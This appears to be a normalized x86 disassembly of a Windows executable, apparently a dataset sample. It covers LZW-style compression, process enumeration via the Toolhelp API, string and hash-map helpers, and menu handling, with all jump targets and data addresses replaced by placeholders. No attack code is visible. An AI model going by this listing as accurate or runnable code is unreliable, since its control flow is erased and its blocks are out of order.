pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
push esi
call sub_40e3d0
mov edx [ rw-data ]
add esp 0x8
mov ecx [ edx + eax * 4 ]
cmp ecx 0xffffffff
je r-xdata
cmp edi 0xffe
ja r-xdata
mov esi ecx
jmp r-xdata
mov edx [ esp + 0x18 ]
push esi
push edx
call sub_40e670
add esp 0x8
test eax eax
jl r-xdata
mov [ edx + eax * 4 ] edi
mov edx [ rw-data ]
inc edi
mov [ edx + eax * 4 ] esi
mov ecx [ rw-data ]
mov [ ecx + eax ] bl
push ebp
call sub_40e5a0
mov ebx eax
add esp 0x4
cmp ebx 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov esi ebx
sub_40e3d0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push ebx
push ebp
shl eax 0x4
push esi
xor eax ecx
push edi
jne r-xdata
mov ebp 0x139d
sub ebp eax
mov ebp 0x1
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esp + 0x14 ]
mov ebx [ esi ]
cmp ebx edx
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea edi [ ebp * 4 ]
lea esi [ ecx + eax * 4 ]
lea ecx [ edx + eax * 4 ]
sub eax ebp
sub ecx edi
sub esi edi
test eax eax
jge r-xdata
mov ebx [ rw-data ]
xor edx edx
mov dl [ ebx + eax ]
mov ebx [ esp + 0x18 ]
cmp edx ebx
je r-xdata
cmp [ ecx ] 0xffffffff
je r-xdata
add eax 0x139d
add ecx 0x4e74
add esi 0x4e74
jmp r-xdata
sub_40e450
push ecx
mov eax [ rw-data ]
test eax eax
jne r-xdata
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
push esi
mov [ esp + 0x14 ] 0x100
call sub_40e600
mov ebp eax
mov eax [ esp + 0x20 ]
push eax
push ebp
mov ebx ebp
call sub_40e5d0
push esi
call sub_40e600
mov edi eax
add esp 0x10
cmp edi 0xfff
je r-xdata
call sub_40e240
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
cmp edi [ esp + 0x10 ]
jb r-xdata
push edi
push rw-data
push ebp
mov [ rw-data ] bl
push rw-data
jmp r-xdata
mov eax [ esp + 0x10 ]
cmp eax 0xffe
ja r-xdata
mov ecx [ esp + 0x1c ]
xor eax eax
mov al [ esi ]
push ecx
push eax
dec esi
call sub_40e5d0
add esp 0x8
test eax eax
jl r-xdata
call sub_40e540
mov esi eax
add esp 0x8
xor ebx ebx
cmp esi rw-data
mov bl [ esi ]
jb r-xdata
mov edx [ esp + 0x18 ]
mov ebp edi
push edx
call sub_40e600
mov edi eax
add esp 0x4
cmp edi 0xfff
jne r-xdata
mov edx [ rw-data ]
inc eax
mov [ esp + 0x10 ] eax
mov [ edx + eax * 4 - 0x4 ] ebp
mov ecx [ rw-data ]
mov [ ecx + eax - 0x1 ] bl
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
cmp esi rw-data
jae r-xdata
sub_40e540
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx 0xff
jbe r-xdata
mov [ eax ] cl
pop esi
retn
mov edx [ rw-data ]
inc eax
mov dl [ edx + ecx ]
mov [ eax - 0x1 ] dl
mov edx [ rw-data ]
mov ecx [ edx + ecx * 4 ]
mov edx esi
inc esi
cmp edx 0xffe
jge r-xdata
push rw-data
call sub_40e7c2
add esp 0x4
push 0xfffffffd
call sub_405e6a
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
cmp ecx 0xff
ja r-xdata
sub_40e5a0
mov ecx [ esp + 0x4 ]
mov edx [ ecx + 0x8 ]
mov eax [ ecx + 0x4 ]
cmp eax edx
jg r-xdata
mov eax [ ecx ]
push ebx
xor ebx ebx
mov bl [ edx + eax ]
inc edx
mov eax ebx
mov [ ecx + 0x8 ] edx
pop ebx
retn
or eax 0xffffffff
retn
sub_40e5d0
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
cmp edx ecx
jg r-xdata
mov edx [ eax ]
push ebx
mov bl [ esp + 0x8 ]
mov [ ecx + edx ] bl
mov ecx [ eax + 0x8 ]
inc ecx
pop ebx
mov [ eax + 0x8 ] ecx
xor eax eax
retn
or eax 0xffffffff
retn
sub_40e600
mov edx [ rw-data ]
cmp edx 0x18
jg r-xdata
mov ecx [ rw-data ]
sub edx 0xc
mov eax ecx
mov [ rw-data ] edx
shl ecx 0xc
shr eax 0x14
mov [ rw-data ] ecx
retn
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_40e5a0
mov edx [ rw-data ]
mov ecx 0x18
sub ecx edx
add edx 0x8
shl eax cl
mov ecx [ rw-data ]
add esp 0x4
mov [ rw-data ] edx
or ecx eax
cmp edx 0x18
mov [ rw-data ] ecx
jle r-xdata
pop esi
sub_40e670
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx 0x14
push esi
mov esi [ esp + 0xc ]
sub ecx edx
shl esi cl
add edx 0xc
mov [ rw-data ] edx
or eax esi
cmp edx 0x8
mov [ rw-data ] eax
jl r-xdata
xor eax eax
pop esi
retn
mov esi [ esp + 0x8 ]
or eax 0xffffffff
pop esi
retn
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub ecx 0x8
shl eax 0x8
cmp ecx 0x8
mov [ rw-data ] eax
mov [ rw-data ] ecx
jge r-xdata
shr eax 0x18
push esi
push eax
call sub_40e5d0
add esp 0x8
test eax eax
jl r-xdata
sub_40e6e0
sub esp 0x128
push ebx
push edi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
lea eax [ esp + 0x8 ]
mov [ esp + 0x8 ] 0x128
push eax
push ebx
xor edi edi
call Process32First
test eax eax
jne r-xdata
pop edi
or eax eax
pop ebx
add esp 0x128
retn
push ebp
mov ebp [ esp + 0x138 ]
lea ecx [ esp + 0x30 ]
push esi
push ecx
push ebp
call sub_408ec0
mov esi [ esp + 0x148 ]
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop ebx
add esp 0x128
retn
lea eax [ esp + 0x10 ]
push eax
push ebx
call Process32Next
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
mov edi 0x1
mov [ esi ] edx
push ebx
call [ CloseHandle@IAT ]
pop esi
mov eax edi
pop ebp
pop edi
pop ebx
add esp 0x128
retn
lea esi [ esi + edi * 4 ]
lea eax [ esp + 0x10 ]
push eax
push ebx
call Process32Next
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
inc edi
mov [ esi ] edx
add esi 0x4
lea ecx [ esp + 0x34 ]
push ecx
push ebp
call sub_408ec0
add esp 0x8
test eax eax
jne r-xdata
sub_40e7c2
push ebx
push esi
mov esi rw-data
push edi
push esi
push 0x1
call sub_404db5
push esi
call sub_40e803
mov edi eax
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x20 ]
push esi
call sub_404319
push esi
push edi
mov ebx eax
call sub_40e890
push esi
push 0x1
call sub_404e07
add esp 0x28
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_40e803
push esi
mov esi [ esp + 0x8 ]
push [ esi + 0x10 ]
call sub_406fef
test eax eax
pop ecx
je r-xdata
xor eax eax
pop esi
retn
cmp esi rw-data
jne r-xdata
cmp esi rw-data
jne r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
cmp [ eax * 4 + rw-data ] 0x0
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x4 ] ebx
push ebx
call sub_406abc
test eax eax
pop ecx
mov [ edi ] eax
jne r-xdata
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
push 0x1
pop eax
pop edi
pop ebx
pop esi
retn
sub_40e890
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
pop esi
retn
mov esi [ esp + 0xc ]
test [ esi + 0xd ] 0x10
je r-xdata
push esi
call sub_404fda
and [ esi + 0xd ] 0xee
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_40e8ba
push esi
mov esi ecx
push 0x80
lea eax [ esi + 0x14 ]
mov [ esi + 0xc ] 0x1
push eax
push [ esi + 0x94 ]
call sub_40f137
neg eax
sbb eax eax
neg eax
mov [ esi + 0x10 ] eax
pop esi
retn
sub_40e8e3
mov eax [ esp + 0xc ]
push esi
test eax eax
mov esi ecx
je r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
and [ eax ] 0x0
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx esi
call sub_40e8ba
mov eax [ esp + 0x8 ]
and [ eax ] 0x0
push [ esp + 0xc ]
lea eax [ esi + 0x14 ]
push eax
push [ esp + 0x10 ]
call [ lstrcpynA@IAT ]
jmp r-xdata
mov eax [ esi + 0x10 ]
pop esi
retn 0xc
sub_40e93f
push esi
mov esi ecx
push edi
xor edi edi
mov ecx [ esi + 0x14 ]
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] edi
call sub_40e9bc
mov [ esi + 0x14 ] edi
pop edi
pop esi
retn
sub_40e978
mov eax [ ecx + 0x4 ]
push esi
mov edx [ eax ]
mov esi [ eax + 0x8 ]
test edx edx
mov [ ecx + 0x4 ] edx
je r-xdata
and [ ecx + 0x8 ] 0x0
and [ edx + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_40e95f
mov eax esi
pop esi
retn
sub_40ea15
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0x0
mov ebx [ esp + 0xc ]
je r-xdata
push eax
call sub_40ecc0
and [ esi + 0x4 ] 0x0
pop ecx
mov [ esi + 0x8 ] ebx
pop esi
pop ebx
retn 0x8
push edi
mov edi ebx
shl edi 0x2
push edi
call sub_40ec97
push edi
push 0x0
push eax
mov [ esi + 0x4 ] eax
call sub_4087f0
add esp 0x10
pop edi
sub_40ea5a
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x14 ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
call sub_40e9bc
and [ esi + 0x14 ] 0x0
pop esi
retn
push eax
call sub_40ecc0
and [ esi + 0x4 ] 0x0
pop ecx
sub_40eaae
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
inc [ esi + 0xc ]
mov [ esi + 0x10 ] ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
pop esi
retn
push 0xc
lea eax [ esi + 0x14 ]
push [ esi + 0x18 ]
push eax
call sub_40e99c
mov ecx [ esi + 0x18 ]
add eax 0x4
lea edx [ ecx + ecx * 2 ]
dec ecx
test ecx ecx
lea eax [ eax + edx * 4 - 0xc ]
jl r-xdata
inc ecx
mov edx [ esi + 0x10 ]
mov [ eax ] edx
mov [ esi + 0x10 ] eax
sub eax 0xc
dec ecx
jne r-xdata
sub_40eb14
push esi
mov esi [ esp + 0x8 ]
mov eax esi
xor edx edx
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esp + 0xc ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
mov eax [ ecx + edx * 4 ]
cmp [ eax + 0x4 ] esi
je r-xdata
pop esi
retn 0x8
mov eax [ eax ]
jmp r-xdata
test eax eax
je r-xdata
sub_40eb46
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov edx [ esi + edx * 4 ]
cmp [ edx + 0x4 ] edi
je r-xdata
mov eax [ edx + 0x8 ]
jmp r-xdata
mov edx [ edx ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test edx edx
je r-xdata
sub_40eb79
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
push edi
call sub_40eb14
test eax eax
jne r-xdata
pop edi
add eax 0x8
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x4 ] eax
jne r-xdata
mov ecx esi
call sub_40eaae
mov [ eax + 0x4 ] edi
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx * 4 ] eax
push 0x1
mov ecx esi
push [ esi + 0x8 ]
call sub_40ea15
sub_40ebc9
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ esp + 0xc ]
xor edx edx
mov eax edi
shr eax 0x4
div [ ecx + 0x8 ]
mov eax [ esi + edx * 4 ]
lea edx [ esi + edx * 4 ]
cmp [ eax + 0x4 ] edi
je r-xdata
mov esi [ eax ]
push eax
mov [ edx ] esi
call sub_40eafb
push 0x1
pop eax
jmp r-xdata
mov edx eax
mov eax [ eax ]
jmp r-xdata
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
sub_40ec0b
mov eax [ esp + 0x4 ]
push esi
push edi
mov esi [ eax ]
cmp esi 0xffffffff
jne r-xdata
mov edi [ esi ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x8 ]
xor edi edi
test edx edx
jbe r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ ecx ] eax
mov ecx [ esp + 0x14 ]
mov eax [ esi + 0x8 ]
pop edi
mov [ ecx ] eax
pop esi
retn 0xc
mov eax [ esi + 0x4 ]
push ebx
mov ebx [ ecx + 0x8 ]
xor edx edx
shr eax 0x4
div ebx
inc edx
cmp edx ebx
jae r-xdata
mov eax [ ecx + 0x4 ]
pop ebx
mov eax [ ecx + 0x4 ]
lea eax [ eax + edx * 4 ]
inc edi
add eax 0x4
cmp edi edx
jb r-xdata
inc edx
add eax 0x4
cmp edx ebx
jb r-xdata
mov esi [ eax ]
test esi esi
jne r-xdata
mov edi [ eax ]
test edi edi
jne r-xdata
sub_40ec97
push esi
push edi
mov edi [ esp + 0xc ]
mov eax esi
pop edi
pop esi
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
call eax
test eax eax
pop ecx
jne r-xdata
push edi
call sub_406abc
mov esi eax
pop ecx
test esi esi
jne r-xdata
sub_40ece9
push ebp
mov ebp esp
sub esp 0x204
mov eax [ ecx ]
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x204 ]
push 0x200
push edx
call [ eax + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x204 ]
push [ ebp + 0x8 ]
push eax
call sub_41284b
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_412883
mov [ ebp + 0xc ] 0xf020
leave
retn 0x8
sub_40ee03
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx ecx
test esi esi
jne r-xdata
push edi
push 0x40
pop edi
cmp esi edi
jg r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
jmp r-xdata
mov edi 0x80
cmp esi edi
jg r-xdata
mov ecx rw-data
pop esi
pop ebx
retn 0x4
mov edi 0x100
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
mov [ eax ] 0x1
and [ eax + esi + 0xc ] 0x0
mov [ eax + 0x4 ] esi
add eax 0xc
mov [ ebx ] eax
pop edi
mov edi 0x200
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
call sub_40c998
mov [ eax + 0x8 ] edi
jmp r-xdata
lea eax [ esi + 0xd ]
push eax
call sub_40ec97
pop ecx
mov [ eax + 0x8 ] esi
mov ecx rw-data
jmp r-xdata
sub_40ee85
mov eax [ ecx + 0x8 ]
cmp eax 0x40
jne r-xdata
cmp eax 0x80
jne r-xdata
push ecx
mov ecx rw-data
cmp eax 0x100
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
cmp eax 0x200
push ecx
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
call sub_40ca27
retn
call sub_40ecc0
pop ecx
retn
mov ecx rw-data
jmp r-xdata
sub_40eecd
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
mov ecx [ esi ]
sub ecx 0xc
call sub_40ee85
sub_40ef21
push esi
push edi
mov edi ecx
mov esi [ edi ]
cmp [ esi - 0xc ] 0x1
jle r-xdata
pop edi
pop esi
retn
call sub_40eecd
push [ esi - 0x8 ]
mov ecx edi
call sub_40ee03
mov eax [ esi - 0x8 ]
inc eax
push eax
push esi
push [ edi ]
call sub_405400
add esp 0xc
sub_40ef4f
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
jg r-xdata
mov ecx esi
call sub_40eecd
push edi
mov ecx esi
call sub_40ee03
cmp edi [ eax - 0x4 ]
jle r-xdata
pop edi
pop esi
retn 0x4
sub_40ef78
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
sub ecx 0xc
call sub_40ee85
sub_40efa2
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_40ef4f
push edi
push [ esp + 0x14 ]
push [ esi ]
call sub_405400
mov eax [ esi ]
add esp 0xc
mov [ eax - 0x8 ] edi
mov eax [ esi ]
and [ eax + edi ] 0x0
pop edi
pop esi
retn 0x8
sub_40efcf
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
xor eax eax
jmp r-xdata
push edi
push eax
mov ecx esi
call sub_40efa2
mov eax esi
pop edi
pop esi
retn 0x4
sub_40eff6
push ebx
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
lea ebx [ eax - 0xc ]
jg r-xdata
push edi
mov edi [ eax - 0x8 ]
cmp ecx edi
jge r-xdata
cmp ecx [ eax - 0x4 ]
jle r-xdata
push ecx
mov ecx esi
call sub_40ee03
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebx + 0xc ]
push eax
push [ esi ]
call sub_405400
mov eax [ esi ]
add esp 0xc
push ebx
mov [ eax - 0x8 ] edi
call sub_40eefe
pop edi
mov ecx edi
mov eax [ esi ]
pop esi
pop ebx
retn 0x4
sub_40f045
push esi
mov esi ecx
call sub_40ef21
mov eax [ esp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov [ ecx - 0x8 ] eax
mov ecx [ esi ]
pop esi
and [ ecx + eax ] 0x0
retn 0x4
push [ esi ]
call [ lstrlenA@IAT ]
sub_40f06d
mov eax sub_4139f8
call sub_40d394
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
cmp [ ecx + 0xc ] eax
mov [ ebp - 0x10 ] esp
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
call [ ecx + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
sub_40f0b3
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi 0x100
push edi
lea eax [ ebp - 0x104 ]
push esi
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
call sub_40f137
mov edi eax
mov eax esi
sub eax edi
cmp eax 0x2
jbe r-xdata
push ebx
mov edi esi
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_40efcf
xor eax eax
test edi edi
setg al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add edi esi
push edi
lea eax [ edi - 0x1 ]
push eax
call sub_40eff6
push eax
push [ ebp + 0x8 ]
call sub_40f137
mov ebx eax
mov eax edi
sub eax ebx
cmp eax 0x2
jle r-xdata
mov ecx [ ebp - 0x4 ]
push 0xffffffff
call sub_40f045
xor eax eax
test ebx ebx
setg al
pop ebx
pop edi
pop esi
leave
retn 0x4
sub_40f137
push esi
call sub_413126
push [ esp + 0x10 ]
mov esi [ esp + 0x10 ]
mov eax [ eax + 0xc ]
push esi
push [ esp + 0x10 ]
push eax
call [ LoadStringA@IAT ]
test eax eax
jne r-xdata
pop esi
retn 0xc
and [ esi ] al
sub_40f18d
mov eax sub_413a94
call sub_40d394
push ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ecx + 0x10 ]
and [ ebp - 0x4 ] 0x0
add ecx 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call [ eax + 0x1c ]
sub_40f1b8
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push ebx
push esi
push 0x1
test eax eax
pop ebx
je r-xdata
mov eax [ ebp + 0x1c ]
cmp eax 0x28
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub eax 0x29
je r-xdata
je r-xdata
mov eax ebx
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
sub eax 0x3
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0xa
je r-xdata
xor ebx ebx
cmp [ esi + 0x1c ] ebx
sete bl
and [ esi + 0x1c ] 0x0
jmp r-xdata
push [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
dec eax
je r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x18 ]
dec eax
je r-xdata
mov ebx eax
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0x16
je r-xdata
push [ ebp + 0x18 ]
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub eax 0x3
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x1c
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub_40f2bf
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
cmp eax 0xfffffffe
mov edi ecx
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
call sub_413126
push [ ebp + 0x14 ]
mov eax [ eax + 0x1038 ]
mov ecx eax
push [ ebp + 0x10 ]
mov edx [ eax ]
push [ ebp + 0x8 ]
push edi
call [ edx + 0x4 ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebp + 0x10 ]
and [ ebp + 0xc ] 0x0
mov ecx edi
mov eax [ ebx + 0x30 ]
mov [ ebp + 0x10 ] eax
mov eax [ edi ]
call [ eax + 0x2c ]
mov edi eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov ebx 0x111
mov ebx eax
movzx eax ax
shr ebx 0x10
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push ebx
push [ esi + 0x4 ]
call sub_4107a9
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov esi eax
mov esi [ edi + 0x4 ]
push [ ebp + 0x14 ]
push [ eax + 0x10 ]
push [ ebp + 0x10 ]
push [ eax + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call sub_40f1b8
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
mov edi [ edi ]
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
test esi esi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] eax
jne r-xdata
add esi 0xc
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push 0x10
push eax
push [ ebp + 0x10 ]
call sub_40d000
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp + 0xc ] 0x1
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40f42d
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x20 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x18 ] ecx
retn
sub_40f453
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
push edi
jne r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov ecx [ esi + 0x14 ]
call sub_411d58
pop edi
mov edi [ esi + 0x14 ]
call [ GetFocus@IAT ]
cmp eax [ edi + 0x1c ]
jne r-xdata
pop esi
retn 0x4
mov ecx [ esp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffd
add ecx 0x3
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ EnableMenuItem@IAT ]
jmp r-xdata
push [ edi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_40fa9e
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov [ esi + 0x18 ] 0x1
push 0x0
push ecx
push [ eax + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_40fa9e
mov ecx eax
call sub_411d7f
mov ecx [ ecx + 0x1c ]
sub_40f4e3
push esi
mov esi ecx
push edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x87
push [ eax + 0x1c ]
call edi
test ah 0x20
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
retn 0x4
mov eax [ esi + 0x14 ]
push 0x0
push [ esp + 0x10 ]
push 0xf1
push [ eax + 0x1c ]
call edi
mov ecx [ esp + 0xc ]
neg ecx
sbb ecx ecx
and ecx 0x8
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ CheckMenuItem@IAT ]
jmp r-xdata
sub_40f545
push esi
push edi
mov esi ecx
xor edi edi
xor ecx ecx
cmp [ esp + 0xc ] edi
mov eax [ esi ]
setne cl
push ecx
mov ecx esi
call [ eax + 0x4 ]
cmp [ esi + 0xc ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x10 ] edi
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push [ rw-data ]
mov eax [ esi + 0xc ]
push edi
push 0x400
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ SetMenuItemBitmaps@IAT ]
call sub_4132cd
cmp [ rw-data ] edi
je r-xdata
sub_40f59b
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov eax [ esi + 0x14 ]
push [ eax + 0x1c ]
call sub_4120cd
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop esi
retn 0x4
mov ecx [ esi + 0x8 ]
push edi
mov edi 0x400
push edi
push ecx
push [ eax + 0x4 ]
call [ GetMenuState@IAT ]
push [ esp + 0xc ]
and ax 0xf6fb
or eax edi
